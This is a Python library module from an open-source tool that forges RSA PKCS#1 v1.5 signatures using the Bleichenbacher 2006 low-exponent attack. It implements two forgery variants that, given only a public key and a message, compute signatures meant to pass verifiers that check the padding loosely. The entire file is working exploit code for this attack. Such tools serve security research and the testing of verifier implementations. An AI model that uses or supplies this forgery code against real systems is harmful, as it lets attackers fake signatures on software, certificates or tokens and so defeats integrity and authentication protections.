#! /usr/bin/env python3


"""
This file is a library unit that exposes the "SignatureForger" class
with two main methods:
"forgeSignature_method_garbage_mid" and
"forgeSignature_method_garbage_end".

You should specify the public key when initializing the class.
Then call one of these methods with a message argument, and it will
return a valid signature of the given message without having a private key.

You can find the code that uses this class in the "Forge.py" module:
it gets the key, message and other arguments from the command line
and prints the generated signature.


This file is part of Bleichenbacher Signature Forger v2.0.

Copyright 2016 Filippo Valsorda
Copyright 2017 Peter Hoeg Steffensen
Copyright 2021 Maxim Masiutin

Bleichenbacher Signature Forger is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

Bleichenbacher Signature Forger is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Bleichenbacher Signature Forger.  If not, see <https://www.gnu.org/licenses/>.
"""

from sys import stderr, exit
from os import urandom
from gmpy2 import get_max_precision, get_context, root
from HashInfo import Hash


def getBitAt(idx, val):
    return (val >> idx) & 0x01


def setBitAt(idx, val):
    return val | (0x01 << idx)


def toInt(val):
    return int.from_bytes(val, byteorder="big")


def toBytes(val, arg_len):
    return int.to_bytes(val, length=arg_len, byteorder="big")


class SignatureForger:
    def __init__(self, keysize, hashAlg, public_exponent, ffcount, quiet):
        self.keysize_bytes = (keysize + 7) // 8
        self.keysize_bits = keysize
        self.hashAlg = Hash(hashAlg)
        self.public_exponent = public_exponent
        self.max_precision = None
        self.ffcount = ffcount
        self.quiet = quiet

    def limit_precision(self, aprecision):
        if self.max_precision is None:
            self.max_precision = get_max_precision() - 16
        return min(
            min(aprecision, self.keysize_bits * 128 * self.public_exponent),
            self.max_precision,
        )

    def encodePkcs1Suffix(self, message):
        messageHash = self.hashAlg.digester(message.encode("utf-8")).digest()
        if messageHash[-1] & 0x01 != 0x01:
            print(
                "Hash value must be uneven. Try a different message or a different hash algorithm",
                file=stderr,
            )
            exit(1)
        suffix = bytes([0]) + self.hashAlg.digestInfo + messageHash
        return suffix

    def constructSignatureSuffix(self, suffix):
        signatureSuffix = 1
        int_suffix = toInt(suffix)
        for idx in range(len(suffix) * 8):
            if getBitAt(idx, pow(signatureSuffix, self.public_exponent)) != getBitAt(
                idx, int_suffix
            ):
                signatureSuffix = setBitAt(idx, signatureSuffix)
        return toBytes(signatureSuffix, (signatureSuffix.bit_length() + 7) // 8)

    def report_small(self, pbl):
        print(
            "Key size is too small or the exponent is too big: the exponentiation of the signature gives",
            pbl,
            "bis and wraps past the modulus of",
            self.keysize_bits,
            "bits",
            file=stderr,
        )

    def addPrefixToSignature(self, signatureSuffix):
        progress = False
        precision = (self.keysize_bits + 7) // 16
        attempts = 0
        prefix = bytes([0x00, 0x01])
        prefix = prefix + ((bytes([0xFF])) * self.ffcount)
        while True:
            get_context().precision = self.limit_precision(precision)
            attempts += 1
            testPrefix = prefix + urandom(self.keysize_bytes - len(prefix))
            signatureCandidate = (
                toBytes(
                    self.nthroot(
                        self.public_exponent,
                        toInt(testPrefix),
                        self.limit_precision(precision),
                    ),
                    self.keysize_bytes,
                )[: -len(signatureSuffix)]
                + signatureSuffix
            )
            sc = toInt(signatureCandidate)
            p = pow(sc, self.public_exponent)
            pbl = p.bit_length()
            if pbl > self.keysize_bits:
                self.report_small(pbl)
                return None

            toCheck = toBytes(p, (pbl + 7) // 8)
            if 0 not in toCheck[: -len(signatureSuffix)]:
                if progress:
                    if not self.quiet:
                        print("")
                if attempts > 1:
                    if not self.quiet:
                        print("Found in", attempts, "attempt(s)")
                return signatureCandidate
            precision = precision + ((precision + 3) // 4)
            if attempts == 10:
                progress = True
                if not self.quiet:
                    print("Generating the signature", end="", flush=True)
            if attempts > 10:
                if not self.quiet:
                    print(".", end="", flush=True)
            if attempts > 100 * self.public_exponent:
                if progress:
                    if not self.quiet:
                        print("")
                return None

    def nthroot(self, e, A, prec):
        get_context().precision = prec
        tu = root(A, e)
        return int(tu)

    def forgeSignature_method_garbage_end(self, message):
        """
        Get message of type 'string' and return signature of type 'binary'.
        The signagure is generated according to the variant 1, with the garbage at the end of the message.
        The length is not checked and the padding is on the form ``0001FF...FF00 | DigestInfo | garbage``
        More info on variant 1 can be found at: <https://www.ietf.org/mail-archive/web/openpgp/current/msg00999.html>"""
        attempts = 0
        prefix = bytes([0x00, 0x01])
        prefix = prefix + ((bytes([0xFF])) * self.ffcount)
        suffix = self.encodePkcs1Suffix(message)
        value = prefix + suffix
        numzeros = self.keysize_bytes - len(value)
        if numzeros < 1:
            print("The key size is too small", file=stderr)
            return None
        plain = value + (bytes([0]) * numzeros)
        plain_int = toInt(plain)
        precision = len(value) * 8
        while True:
            attempts += 1
            signature = self.nthroot(
                self.public_exponent, plain_int, self.limit_precision(precision)
            )
            plain2 = pow(signature, self.public_exponent)
            pbl = plain2.bit_length()
            if pbl > self.keysize_bits:
                self.report_small(pbl)
                return None

            plain2_bytes = toBytes(plain2, self.keysize_bits)
            if value in plain2_bytes:
                break
            if not self.quiet:
                print("Trying to raise precision...")
            precision = precision * 2
            if attempts > 4:
                return None

        signature_bytes = (signature.bit_length() + 7) // 8
        return toBytes(signature, signature_bytes)

    def forgeSignature_method_garbage_mid(self, message):
        """
        Get message of type 'string' and return signature of type 'binary'.
        The signagure is generated according to the variant 2, with the garbage in the middle of the message.
        The filler (PS) is not checked - ``0001FF...FF | non-zero-garbage | 00 | DigestInfo``
        Credit for the variant 2 goes to Filippo Valsorda who publihed
        the original version of the code in 2016 (<https://blog.filippo.io/bleichenbacher-06-signature-forgery-in-python-rsa/>)
        """
        suffix = self.encodePkcs1Suffix(message)
        signatureSuffix = self.constructSignatureSuffix(suffix)
        signature = self.addPrefixToSignature(signatureSuffix)
        return signature

    def forgeSignature(self, message, variant):
        if variant == 1:
            return self.forgeSignature_method_garbage_end(message)
        elif variant == 2:
            return self.forgeSignature_method_garbage_mid(message)
        else:
            raise ValueError(
                "The value of the 'variant' parameter should be either 1 or 2"
            )
